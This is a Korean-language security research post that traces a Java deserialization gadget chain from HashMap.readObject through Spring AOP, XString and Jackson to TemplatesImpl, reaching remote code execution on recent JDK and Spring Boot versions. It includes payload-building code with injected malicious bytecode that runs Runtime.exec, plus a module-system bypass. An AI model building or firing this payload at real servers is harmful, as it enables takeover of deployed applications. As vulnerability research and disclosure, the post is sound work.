---
title : "Finding Gadgets Like It's 2026: Auto-Trigger Deserialization Gadget Chain on JDK 17/21/25 and Spring Boot 3.2.x-4.0.5(KOR)"
date : 2026-04-19 10:00:00 +0900
categories: [Research]
tags: [Java, Spring, Gadget, Unserialize]
---
# Victims Code

해당 체인은 타겟 서버에 아래와 같은 역직렬화 로직이 있다고 가정한다.

```java
new ObjectInputStream(input).readObject();
```

타겟 서버에서 이 한 줄이 실행되는 순간, 우리가 만든 Java 직렬화 바이트 스트림이 객체 그래프로 복원되기 시작한다. 우리는 이미 이 input에 미리 조작한 HashMap 기반 payload를 넣어둔다. 

Java 직렬화 바이트스트림에는 객체의 클래스 디스크립터가 포함되어 있다. victim이 ObjectInputStream.readObject()를 호출하면 ObjectInputStream은 스트림을 읽으면서 지금 복원해야 할 객체가 java.util.HashMap이라고 판단하고 그 클래스의 역직렬화 경로를 따라간다. 

여기서 중요한 점은, 역직렬화 대상 클래스에 private readObject(ObjectInputStream)가 정의되어 있으면 java 직렬화 매커니즘이 그 메서드를 자동으로 호출한다는 것이다. HashMap은 자체 readObject()를 가지고 있으므로 결국 체인은 다음 지점에서 시작된다.

```java
ObjectInputStream.readObject()
  → HashMap.readObject()
```

victim 입장에서는 readObject() 한 번을 호출했지만 이게 HashMap.readObject() 내부 로직이 자동으로 실행되며 이후 체인이 열리게 된다.

---

# 1. HashMap.readObject()

<aside>
💡

JDK — java.base 모듈
Path : jdk/src/java.base/share/classes/java/util/HashMap.java

</aside>

모든 체인의 시작점은 HashMap.readObject()이다. ObjectInputStream.readObject가 호출 되면 역직렬화 되는 객체가 HashMap이므로 자바 직렬화 매커니즘이 자동으로 HashMap의 커스텀 readObject()를 호출한다.

HashMap의 readObject 코드

```java
private void readObject(ObjectInputStream s)
        throws IOException, ClassNotFoundException {

        ObjectInputStream.GetField fields = s.readFields();

        // Read loadFactor (ignore threshold)
        float lf = fields.get("loadFactor", 0.75f);
        if (lf <= 0 || Float.isNaN(lf))
            throw new InvalidObjectException("Illegal load factor: " + lf);

        lf = Math.clamp(lf, 0.25f, 4.0f);
        HashMap.UnsafeHolder.putLoadFactor(this, lf);

        reinitialize();

        s.readInt();                // Read and ignore number of buckets
        int mappings = s.readInt(); // Read number of mappings (size)
        if (mappings < 0) {
            throw new InvalidObjectException("Illegal mappings count: " + mappings);
        } else if (mappings == 0) {
            // use defaults
        } else if (mappings > 0) {
            double dc = Math.ceil(mappings / (double)lf);
            int cap = ((dc < DEFAULT_INITIAL_CAPACITY) ?
                       DEFAULT_INITIAL_CAPACITY :
                       (dc >= MAXIMUM_CAPACITY) ?
                       MAXIMUM_CAPACITY :
                       tableSizeFor((int)dc));
            float ft = (float)cap * lf;
            threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                         (int)ft : Integer.MAX_VALUE);

            // Check Map.Entry[].class since it's the nearest public type to
            // what we're actually creating.
            SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);
            @SuppressWarnings({"rawtypes","unchecked"})
            Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
            table = tab;

            // Read the keys and values, and put the mappings in the HashMap
            for (int i = 0; i < mappings; i++) {
                @SuppressWarnings("unchecked")
                    K key = (K) s.readObject();
                @SuppressWarnings("unchecked")
                    V value = (V) s.readObject();
                putVal(hash(key), key, value, false, false);
            }
        }
    }
```

이 체인에서 가장 중요한 건 맨 아래의 반복문이다.

```java
for (int i = 0; i < mappings; i++) {
    K key = (K) s.readObject();      // 바이트 스트림에서 키 복원
    V value = (V) s.readObject();    // 바이트 스트림에서 값 복원
    putVal(hash(key), key, value, false, false);  // ← 여기서 체인 시작
}
```

mappings는 HashMap에 들어있는 key-value 쌍의 수이다. 우리가 만든 페이로드에는 두 개의 엔트리가 들어 있으므로 mappings=2가 된다. 즉 HashMap.readObject()는 스트림에서 두 개의 키를 순서대로 읽고, 각각 putVal()을 호출해 내부 테이블에 다시 삽입한다.

이때 먼저 hash(key)가 호출된다. 

```java
static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```

우리가 심어 둔 두 키는 아래와 같다.

- key1 = HotSwappableTargetSource(target = POJONode) - 먼저 삽입
- key2 = HotSwappableTargetSource(target = XString) - 나중에 삽입

두 key 모두 HotSwappableTargetSource이기 때문에 hash(key) 내부에서는 결국 HotSwappableTargetSource.hashCode()가 호출된다. 

다음으로 putVal() 함수를 살펴보면, HashMap은 같은 버킷에 이미 다른 키가 있는지 확인하면서 필요하면 equals()를 호출한다.

```java
final V putVal(int hash, K key, V value, boolean onlyIfAbsent,
               boolean evict) {
    Node<K,V>[] tab; Node<K,V> p; int n, i;
    if ((tab = table) == null || (n = tab.length) == 0)
        n = (tab = resize()).length;
    if ((p = tab[i = (n - 1) & hash]) == null)
        tab[i] = newNode(hash, key, value, null);
    else {
        Node<K,V> e; K k;
        if (p.hash == hash &&
            ((k = p.key) == key || (key != null && key.equals(k))))
            e = p;
        ...
    }
}
```

HashMap은 내부적으로 Node[] table 배열을 가지고 있고, 각 칸을 버킷이라고 부른다. 핵심은 아래의 코드이다.

```java
i = (n - 1) & hash
```

→ 배열의 크기가 같고 hash 값이 같으면 두 키는 항상 같은 버킷 인덱스로 들어간다.

첫 번째 키가 들어갈 때는 버킷이 비어 있기 때문에 그냥 삽입된다.

```java
첫 번째 key = HotSwappableTargetSource(POJONode)
	-> hash 계산
	-> 해당 버킷이 비어 있음
	-> 그냥 삽입
```

하지만 두 번째 키가 들어갈 떄는 상황이 달라진다.

```java
두 번째 key = HotSwappableTargetSource(XString)
	-> hash 계산
	-> 첫 번째 키와 같은 hash
	-> 같은 버킷으로 진입
	-> 기존 키와 비교 필요
	-> key.equals(existingKey) 호출
```

실제로 putVal()은 아래와 같은 조건에서 equals()를 호출한다.

```java
if (p.hash == hash &&
    ((k = p.key) == key ||
     (key != null && key.equals(k))))
```

여기서 평가되는 순서는 아래와 같다.

1. p.hash == hash
    1. 첫번째 키와 두번째 키의 hash가 같으므로 true
2. (k = p.key) == key
    1. 서로 다른 인스턴스이므로 false
3. key ≠ null && key.equals(k) 호출
    1. 결국 key.equals(exsitingKey) 호출

즉 실제로는 아래와 같은 호출이 발생하는 것이다.

```java
HotSwappableTargetSource(XString).equals(HotSwappableTargetSource(POJONode))
```

여기서 체인이 다음 단계로 넘어간다. 중요한 점은, hash 충돌이 없다면 이 equals()는 절대 호출되지 않는다는 것이다. 이 체인은 HashMap의 충돌 처리 로직을 이용해 강제로 equals()를 밟게 만드는 구조이다.

---

# 2. hash 충돌 — HotSwappableTargetSource.hashCode()

<aside>
💡

Spring AOP — spring-aop-6.x.jar
Paht : spring-framework/spring-aop/src/main/java/org/springframework/aop/target/HotSwappableTargetSource.java

</aside>

이전 과정에서 두 키의 hash가 동일하기 때문에 equals()가 호출된다고 설명했다. 그 이유는 HotSwappableTargetSource.hashCode() 구현이 매우 특이하기 때문이다.

```java
@Override
public int hashCode() {
    return HotSwappableTargetSource.class.hashCode();
}
```

보통 객체의 hashCode()는 내부 상태에 따라 달라진다. 예를 들어서 String을 보면

```java
"hello".hashCode()
"world".hashCode()
-> 문자열 내용이 다르면 해시도 달라짐
```

하지먼 HotSwappableTargetSource는 내부 필드인 target을 전혀 사용하지 않는다. 오직 HotSwappableTargetSource.class라는 클래스 객체의 해시만 반환한다. 이러한 이유 때문에 아래 세 객체는 모두 같은 해시값을 가지게 된다.

```java
new HotSwappableTargetSource(POJONode).hashCode()
new HotSwappableTargetSource(XString).hashCode()
new HotSwappableTargetSource("dummy").hashCode()
```

→ 결과 : HotSwappableTargetSource.class.hashCode()

따라서 인스턴스 내부에 무엇이 들어있든 상관없이 모든 HotSwappableTargetSource 객체는 동일한 해시값을 가진다. HashMap 입장에서는 이 객체들이 전부 같은 버킷으로 들어오므로, 충돌 처리 과정에서 equals() 호출이 강제된다.

이것이 본 체인의 트리거 매커니즘이다. 본 연구에서 참고했던 JDK7u21 체인처럼 해시값을 정교하게 맞추는 트릭이 필요한 것이 아니라, HotSwappableTargetSource 자체가 구조적으로 항상 충돌하는 키 역할을 해준다.

이 클래스가 체인에서 유용한 이유는 세 가지 조건을 동시에 만족하기 때문이다.

1. Serializable 구현
2. hashCode()가 사실상 고정값임
3. equals()가 내부 target.equals(..)로 넘어감

즉 역직렬화가 가능하고 HashMap 충돌을 보장하며 충돌 이후에는 우리가 넣어둔 target 객체끼리 equals()를 밟게 만들 수 있다.

---

# 3. HotSwappableTargetSource.equals() → XString.equals(POJONode)

<aside>
💡

Spring AOP — spring-aop-6.x.jar / JDK — java.xml 모듈
Path : spring-framework/spring-aop/src/main/java/org/springframework/aop/target/HotSwappableTargetSource.java, jdk/src/java.xml/share/classes/com/sun/org/apache/xpath/internal/objects/XString.java

</aside>

직전의 과정의 마지막에서 아래와 같은 호출이 발생했다.

```java
HotSwappableTargetSource(XString).equals(HotSwappableTargetSource(POJONode))
```

HotSwappableTargetSource.equals() 구현을 보면

```java
@Override
public boolean equals(@Nullable Object other) {
    return (this == other || (other instanceof HotSwappableTargetSource that &&
            this.target.equals(that.target)));
            // XString.equals(POJONode)
}
```

즉 두 HotSwappableTargetSource 객체를 비교할 때 실제 비교는 내부 target 객체의 equals()에서 진행하는 것이다.

현재

- [this.target](http://this.target) = XString
- [that.target](http://that.target)  = POJONode

이므로 XString.equals(POJONode)가 호출된다.

여기서 put 순서가 결정적이다. POJONode를 담은 키가 먼저 들어가 기존 키가 되고 XString을 담은 키가 나중에 들어가 새로운 키가 된다. HashMap은 새로운 키 쪽의 equals()를 호출하므로 방향은 반드시 XString.equals(POJONode)가 된다.

반대로 순서를 바꾸면 POJONode.equals(XString)이 호출되는데 이 경우 POJONode.equals()의 상대 타입을 검사하고 실패하므로 체인이 진행되지 않음.

이제 XString.equals() 구현을 보면 이 순서가 중요한 이유를 직관적으로 이해할 수 있다.

```java
public boolean equals(Object obj2)
{
    if (null == obj2)
        return false;
    else if (obj2 instanceof XNodeSet)
        return obj2.equals(this);
    else if (obj2 instanceof XNumber)
        return obj2.equals(this);
    else
        return str().equals(obj2.toString());
}
```

obj2는 POJONode이므로 XNodeSet도 아니고 XNumber도 아니다. 결국에는 

```java
return str().equals(obj2.toString());
```

→ 여기로 들어감 → obj2.toString()이 호출됨

이 순간 체인은 equals() → toString() 호출 경로로 넘어간다.

```java
<실제 호출 흐름>
HotSwappableTargetSource.equals()
  → this.target.equals(that.target)
  → XString.equals(POJONode)
    → obj2.toString()
    → POJONode.toString()
```

이 체인이 중요한 이유는, 예전에는 BadAttributeValueExpException를 활용해서 toString()을 바로 호출할 수 있었다. 하지만 jdk 8+ 이후로 역직렬화 중 임의 객체의 toString() 호출을 제거했다. 하지만 해당 체인을 활용하면 이를 XString.equals()로 우회하여 toString()을 호출할 수 있다.

---

# 4. POJONode.toString() → Jackson serialize → proxy.getOutputProperties()

바로 이전의 단계에서 XString.equals(POJONode)가 호출 되었고, 마지막 줄에서 obj2.toString()이 실행된다.

```java
// XString.java
public boolean equals(Object obj2)
{
    if (null == obj2)
        return false;
    else if (obj2 instanceof XNodeSet)
        return obj2.equals(this);
    else if (obj2 instanceof XNumber)
        return obj2.equals(this);
    else
        return str().equals(obj2.toString());
}
```

여기서 obj2는 POJONode이므로, 결국 POJONode.toString()이 호출된다. 하지만 POJONode 자체에는 toString()이 직접 정의되어 있지 않다. 따라서 자바 상속 규칙에 따라 부모 클래스인 BaseJsonNode.toString()이 실행 된다.

```java
// BaseJsonNode.java
@Override
public String toString() {
    return InternalNodeMapper.nodeToString(this);
}
```

즉, POJONode.toString()은 단순 문자열 반환이 아니라 Jackson 내부 helper인 InternalNodeMapper.nodeToString()으로 이어진다. 

```java
// InternalNodeMapper.java
public static String nodeToString(JsonNode n) {
    try {
        return STD_WRITER.writeValueAsString(n);
    } catch (IOException e) {
        throw new RuntimeException(e);
    }
}
```

여기서 STD_WRITER는 jackson의 ObjectWriter이고, 결국 writeValueAsString()이 호출된다. 따라서 POJONode.toString()은 내부적으로 jackson 직렬화를 수행한다. 이제 jackson은 POJONode를 json으로 직렬화 해야 하므로 POJONode.serialize()를 호출한다.

```java
// POJONode.java
@Override
public final void serialize(JsonGenerator gen, SerializerProvider ctxt) throws IOException
{
    if (_value == null) {
        ctxt.defaultSerializeNull(gen);
    } else if (_value instanceof JsonSerializable) {
        ((JsonSerializable) _value).serialize(gen, ctxt);
    } else {
        ctxt.defaultSerializeValue(_value, gen);
    }
}

```

여기서 핵심은 마지막 줄이다. 

```java
ctxt.defaultSerializeValue(_value, gen);
```

이 체인에서 _value에는 공격자가 넣어둔 Proxy(Templates)가 들어있다. 실제 페이로드 생성 코드를 참고하자면 아래와 같다.

```java
TemplatesImpl t = new TemplatesImpl();
setField(t, "_bytecodes", new byte[][]{makeEvil("/tmp/PWNED_AUTO.txt")});
setField(t, "_name", "die.verwandlung.Auto");
setField(t, "_tfactory", new TransformerFactoryImpl());
setField(t, "_class", null);

SingletonTargetSource sts = new SingletonTargetSource(t);
AdvisedSupport advised = new AdvisedSupport();
advised.setTargetSource(sts);
advised.setInterfaces(Templates.class);

Constructor<?> ctor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy")
    .getDeclaredConstructor(AdvisedSupport.class);
ctor.setAccessible(true);

Templates proxy = (Templates) Proxy.newProxyInstance(
    Templates.class.getClassLoader(),
    new Class[]{Templates.class, Serializable.class},
    (InvocationHandler) ctor.newInstance(advised));
```

그리고 proxy가 그대로 POJONode 안에 들어간다.

```java
POJONode pojoNode = new POJONode(proxy);
```

역직렬화 후 POJONode._value = Proxy(Temeplates) 상태가 된다.

Jackson은 defaultSerializeValue(_value, gen)를 호출하면 _value를 일반 Java bean처럼 취급하는데 그러면 getter를 찾아서 프로퍼ㅌ를 직렬화 하려고 한다. 실제로 jackson의 BeanPropertyWriter는 getter를 아래와 같이 반사 호출한다.

```java
// BeanPropertyWriter.java
final Object value = (_accessorMethod == null) ? _field.get(bean)
        : _accessorMethod.invoke(bean, (Object[]) null);
```

여기서 bean이 바로 Proxy(Templates)이므로, jackson은 Proxy가 구현하는 공개 인터페이스 Templates를 기준으로 getter를 수집하고, 그 과정에서 getOutputProperties()를 발견한다.

이 흐름을 요약하면

```java
XString.equals(POJONode)
  → POJONode.toString()
    → BaseJsonNode.toString()
      → InternalNodeMapper.nodeToString()
        → ObjectWriter.writeValueAsString()
          → POJONode.serialize()
            → ctxt.defaultSerializeValue(_value, gen)
              → Jackson이 _value = Proxy(Templates)를 Bean으로 직렬화
              → getter 탐색
              → proxy.getOutputProperties() 호출
```

이런 체인으로 호출이 되고, 여기서부터 체인은 Jackson이 아닌 JDK Proxy + Spring AOP 쪽으로 넘어간다.

## Bypass JPMS Module system - Proxy를 사용하는 이유

jackson이 _value 객체를 직렬화 하려면 먼저 해당 객체의 클래스를 introspect 해야한다. 이 뜻은 객체에 어떤 getter가 있는지를 확인한다는 것이다.

만약 _value에 TemplatesImpl을 직접 넣었다면

```java
Jackson이 _value.getClass()를 호출
→ TemplatesImpl.class 반환
→ 패키지: com.sun.org.apache.xalan.internal.xsltc.trax
→ java.xml 모듈에서 export되지 않은 패키지
→ Jackson이 이 클래스의 메서드에 접근 시도
→ IllegalAccessException 
```

→ 이렇게 예외처리 됐을 것이다.

하지만 _value에 Proxy 객체를 넣었기 때문에

```java
Jackson이 _value.getClass()를 호출
→ jdk.proxy1.$Proxy0.class 반환
→ 패키지: jdk.proxy1 (export된 패키지!)
→ Jackson이 Proxy의 인터페이스(Templates)를 기준으로 introspect
→ Templates 인터페이스의 getter 발견: getOutputProperties()
→ 접근 제한 없음 
```

Proxy 클래스는 JDK가 런타임에 jdk.proxy1 패키지 아래에 동적으로 생성한다. 이 패키지는 export 된 상태이므로 Jackson이 자유롭게 introspect 할 수 있다. Jackson Proxy가 구현하는 Templates 인터페이스를 보고, 거기에 정의된 getOutputProperties()라는 getter를 발견한다.

# proxy.getOutputProperties() → JdkDynamicAopProxy.invoke()

<aside>
💡

JDK — java.base 모듈 (Proxy) + Spring AOP — spring-aop-6.x.jar
Path :

- jdk/src/java.base/share/classes/java/lang/reflect/Proxy.java
- spring-framework/spring-aop/src/main/java/org/springframework/aop/framework/JdkDynamicAopProxy.java
- spring-framework/spring-aop/src/main/java/org/springframework/aop/framework/AdvisedSupport.java
- spring-framework/spring-aop/src/main/java/org/springframework/aop/target/SingletonTargetSource.java
- spring-framework/spring-aop/src/main/java/org/springframework/aop/support/AopUtils.java
</aside>

직전의 과정에서 jackson이 proxy.getOutputProperties()를 호출했다.

## Proxy → InvocationHandler

proxy는 JDK Dynamic proxy 객체이다. 자바 프록시의 기본 동작은 프록시 인터페이스를 통한 메서드 호출을 InvocationHandler.invoke()로 넘기는 것이다. 실제 Proxy 클래스 주석을 보면 나와있다.

```java
// Proxy.java
A method invocation on a proxy instance through one of its proxy
interfaces will be dispatched to the InvocationHandler#invoke
method of the instance's invocation handler
```

 즉 jackson이 proxy.getOutputProperties()를 호출하면, 내부적으로 아래와 같이 바뀐다.

```java
InvocationHandler.invoke(proxy, method=getOutputProperties, args=null)
```

그럼 공격자는 페이로드를 생성 할때 Proxy의 InvocationHandler로 Spring AOP의 JdkDynamicProxy를 설정해둔다.

```java
Templates proxy = (Templates) Proxy.newProxyInstance(
    Templates.class.getClassLoader(),
    new Class[]{Templates.class, Serializable.class},
    (InvocationHandler) ctor.newInstance(advised)
);
```

따라서 호출은  proxy.getOutputProperties() → JdkDynamicAopProxy.invoke(proxy, method, args) 이렇게 넘어간다.

## JdkDynamicAopProxy.invoke()

JdkDynamicAopProxy는 spring aop의 핵심 dispather이다. 이 클래스의 InvocationHandler이면서 직렬화 가능하기 때문에 페이로드 안에 들어가서 역직렬화 후에도 그대로 Proxy 호출을 받을 수 있다. invoke() 내부를 보면 equals()와 hashCode() 같은 일부 특수 메서드를 먼저 처리하지만, getOutputProperties()는 그런 특수 케이스가 아니므로 일반 경로로 내려간다.

해당 로직은 아래와 같이 짜여져있다.

```java
// JdkDynamicAopProxy.java
target = targetSource.getTarget();
Class<?> targetClass = (target != null ? target.getClass() : null);
List<Object> chain = this.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass);

if (chain.isEmpty()) {
    Object[] argsToUse = AopProxyUtils.adaptArgumentsIfNecessary(method, args);
    retVal = AopUtils.invokeJoinpointUsingReflection(target, method, argsToUse);
}
```

즉, JdkDynamicProxy는 내부 설정 객체에서 TargetSource를 꺼내고, 거기서 실제 타겟 객체를 얻을 뒤에 바은 메서드 호출을 그 타겟에게 reflective하게 전달한다.

## AdvisedSupport - 연결 설정 객체

위에서 나오는 this.advised는 AdviesdSupport 객체이다. 이 객체는 프록시가 어떤 인터페이스를 구현하는지, 실제 target이 무엇인지, 어떤 TargetSource를 사용할지를 보관한다.

우리는 페이로드를 아래와 같이 구성했다.

```java
AdvisedSupport advised = new AdvisedSupport();
advised.setTargetSource(sts);
advised.setInterfaces(Templates.class);
```

따라서 this.advised.targetSource는 SingletonTargetSource를 가르키고 Proxy는 Templates 인터페이스를 구현한다.

## SingletonTargetSource.getTarget()

이제 targetSource.getTarget()가 호출되면 SingletonTargetSource의 getTarget()이 실행된다.

```java
// SingletonTargetSource.java
private final Object target;

public SingletonTargetSource(Object target) {
    this.target = target;
}

@Override
public Object getTarget() {
    return this.target;
}
```

여기서 핵심은 target 필드가 Object 타입이라는 것이다. 여기에 특정 프레임워크 객체만 들어갈 필요가 없고, 우리가 원하는 임의 객체를 그대로 담을 수 있다는 뜻이다.

이 체인에서 우리는 TemplatesImpl을 삽입하였다.

```java
SingletonTargetSource sts = new SingletonTargetSource(t);   // t = TemplatesImpl
```

따라서 getTarget()의 반환값은 그대로 TemplatesImpl이다.

## method.invoke(TemplatesImpl)

다음으로 Spring은 AopUtils.invokeJoinpointUsingReflection()을 통해 받은 메서드를 실제 target 객체에 전달한다.

```java
// AopUtils.java
public static Object invokeJoinpointUsingReflection(@Nullable Object target, Method method, Object[] args)
        throws Throwable {
    ReflectionUtils.makeAccessible(method);
    return method.invoke(target, args);
}
```

여기서 method = Templates.getOutputProperties(), target = TemplatesImpl 이다.

TemplatesImpl은 공개 인터페이스 javax.xml.transform.Templates를 구현하고 있기에 인터페이스 메서드를 통한 reflection 호출은 정상적으로 성공하게 된다.

여기서 중요한 포인트는 jackson이 직접 TemplatesImpl을 introspection하는 것이아니라는 것이다. jackson은 어디까지나 Proxy(Templates)만 본다. 실제 내부 구현체 TemplatesImpl에 대한 호출은 Spring AOP가 대신 수행한다. 그래서 jackson이 직접 TemplatesImpl의 비공개 구현에 접근하지 않고도 결국 해당 메서드를 실행하게 된다.

흐름을 정리하자면

```java
proxy.getOutputProperties()
  → JdkDynamicAopProxy.invoke()
    → this.advised.targetSource
    → SingletonTargetSource.getTarget()
    → target = TemplatesImpl
    → AopUtils.invokeJoinpointUsingReflection()
      → method.invoke(TemplatesImpl)
        → TemplatesImpl.getOutputProperties()
```

여기서부터 sink인 TemplatesImpl 내부로 진입한다.

# TemplatesImpl.getOutputProperties() → RCE

<aside>
💡

JDK — java.xml 모듈
Path :

- jdk/src/java.xml/share/classes/com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java
- jdk/src/java.xml/share/classes/com/sun/org/apache/xalan/internal/xsltc/trax/TransformerFactoryImpl.java
- jdk/src/java.base/share/classes/java/lang/ClassLoader.java
- jdk/src/java.base/share/classes/java/lang/Runtime.java
</aside>

이전 과정의 마지막에서 method.invoke(TemplatesImpl)이 호출되면서 TemplatesImpl.getOutputProperties()에 도달했다. 겉으로 보면 단순 getter처럼 보이겠지만 내부적으로는 translet 클래스를 로딩하고 인스턴스화 화는 위험한 경로를 탄다.

```java
// TemplatesImpl.java
public synchronized Properties getOutputProperties() {
    try {
        return newTransformer().getOutputProperties();
    } catch (TransformerConfigurationException e) {
        return null;
    }
}

<호출 흐름>
getOutputProperties()
  → newTransformer()
    → getTransletInstance()
      → defineTransletClasses()
```

## 우리가 미리 심어둔 _bytecodes

공격자는 페이로드 생성 시 TemplatesImpl 내부 필드를 조작해 악성 바이트코드를 넣어둔다.

```java
TemplatesImpl t = new TemplatesImpl();
setField(t, "_bytecodes", new byte[][]{makeEvil("/tmp/PWNED_AUTO.txt")});
setField(t, "_name", "die.verwandlung.Auto");
setField(t, "_tfactory", new TransformerFactoryImpl());
setField(t, "_class", null);
```

그리고 PoC의 makeEvil()은 실제로 [die.verwandlung.Auto](http://die.verwandlung.Auto) 클래스를 만들어 그 바이트코드를 _bytecodes에 삽입한다.

```java
// FullAutoChain3.java
static byte[] makeEvil(String p) throws Exception {
    String s = "package die.verwandlung;\n" +
        "import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\n" +
        "public class Auto extends AbstractTranslet {\n" +
        "    static{try{Runtime.getRuntime().exec(new String[]{\"touch\",\""+p+"\"});}catch(Exception e){}}\n" +
        "}\n";
    ...
}
```

즉 피해자의 classpath에 원래 있던 클래스가 아니라 페이로드 안에 포함된 바이트 배열이 런타임에 동적으로 클래스가 되는 구조이다.

## defineTransletClasses() - translet 클래스 정의

getTransletInstance()는 _class == null 이면 먼저 defineTransletClasses()를 호출한다.

```java
// TemplatesImpl.java
private Translet getTransletInstance()
    throws TransformerConfigurationException {
    try {
        if (_name == null) return null;

        if (_class == null) defineTransletClasses();

        AbstractTranslet translet = (AbstractTranslet)
                _class[_transletIndex].getConstructor().newInstance();
        ...
        return translet;
    }
    ...
}
```

이 메서드는 _bytecodes 안에 든 바이트 배열을 실제 JVM 클래스로 정의한다. jdk 9+(9 이상) 에서는 단순히 defineClass()만 하는 것이 아니라, translet용 동적 모듈 설정도 같이 수행한다.

```java
// TemplatesImpl.java
String mn = "jdk.translet";
String pn = _tfactory.getPackageName();

ModuleDescriptor descriptor =
    ModuleDescriptor.newModule(mn, Set.of(ModuleDescriptor.Modifier.SYNTHETIC))
                    .requires("java.xml")
                    .exports(pn, Set.of("java.xml"))
                    .build();

Module m = createModule(descriptor, loader);

for (int i = 0; i < classCount; i++) {
    _class[i] = loader.defineClass(_bytecodes[i], pd);
}

```

즉 jdk.translet이라는 synthetic module을 만들고, translet 클래스가 들어갈 패키지를 java.xml 쪽에 export한 뒤, _bytecodes를 실제 클래스로 정의한다. 이때 translet 패키지명은 TransformerFactoryImpl의 기본 설정을 따른다.

```java
// TransformerFactoryImpl.java
private static final String DEFAULT_TRANSLATE_PACKAGE = "die.verwandlung";
private String _packageName = DEFAULT_TRANSLATE_PACKAGE;
```

그래서 PoC에서 악성 클래스 이름을 die.verwandlung.Auto로 맞춰 두는 것이다.

## defineClass() 직후가 아닌 newInstance() 시점에 Initialize

여기서 중요한 정확성 포인트가 있다. defineClass()는 우선 클래스를 정의할 뿐이고, 실제 클래스 초기화(<client>)는 그 클래스가 처음 적극적으로 사용될 때 발생한다. 이 체인에서는 그 시점이 바로 getTransletInstance() 안의 다음 줄이다. 

```java
AbstractTranslet translet = (AbstractTranslet)
        _class[_transletIndex].getConstructor().newInstance();
```

즉 흐름은 아래와 같다.

```java
defineTransletClasses()
  → loader.defineClass(_bytecodes[i], pd)           // 클래스 정의
getTransletInstance()
  → _class[_transletIndex].getConstructor().newInstance()
    → 클래스 초기화(<clinit>)
```

따라서 RCE의 직접적인 트리거는 defineClass() 그 자체가 아니라 그 다음 이어지는 newInstance()에 의한 클래스 초기화이다.

## <client> → Runtime.exec() → RCE

우리가 사전에 심어둔 클래스 안에는 static {} 블록이 들어있다.

```java
public class Auto extends AbstractTranslet {
    static {
        Runtime.getRuntime().exec(...);
    }
}
```

그 결과 newInstance() 시점에 클래스 초기화가 발생하면서 static {} 블록이 실행되고, 그 안의 Runtime.getRuntime().exec()가 호출되어 RCE에 도달한다.

```java
TemplatesImpl.getOutputProperties()
  → newTransformer()
    → getTransletInstance()
      → defineTransletClasses()
        → "jdk.translet" 모듈 생성
        → translet package export
        → loader.defineClass(_bytecodes[i], pd)
      → _class[_transletIndex].getConstructor().newInstance()
        → 클래스 초기화(<clinit>)
          → Runtime.getRuntime().exec()
            → RCE
```

# Full Chain

```java
피해자: new ObjectInputStream(input).readObject()
  → HashMap.readObject() → putVal()                          [JDK]
    → hash 충돌 (HotSwappableTargetSource.hashCode() 고정값) [Spring AOP]
    → HotSwappableTargetSource.equals()                      [Spring AOP]
      → XString.equals(POJONode)                             [JDK, java.xml]
        → obj2.toString()
        → POJONode.toString()                                [Jackson]
          → BaseJsonNode.toString()
          → InternalNodeMapper.nodeToString()
          → ObjectWriter.writeValueAsString()
          → POJONode.serialize()
          → ctxt.defaultSerializeValue(_value, gen)          (_value = Proxy(Templates))
            → Jackson이 Templates 인터페이스 getter 인식
            → proxy.getOutputProperties()                    [JDK Proxy]
              → JdkDynamicAopProxy.invoke()                  [Spring AOP]
                → AdvisedSupport.targetSource
                → SingletonTargetSource.getTarget()
                → target = TemplatesImpl
                → AopUtils.invokeJoinpointUsingReflection()
                  → method.invoke(TemplatesImpl)
                    → TemplatesImpl.getOutputProperties()    [JDK, java.xml]
                      → newTransformer()
                      → getTransletInstance()
                      → defineTransletClasses()
                        → "jdk.translet" 모듈 생성 + export 설정
                        → defineClass(_bytecodes[i])
                      → getConstructor().newInstance()
                        → <clinit>
                        → Runtime.getRuntime().exec()
                        → RCE
```
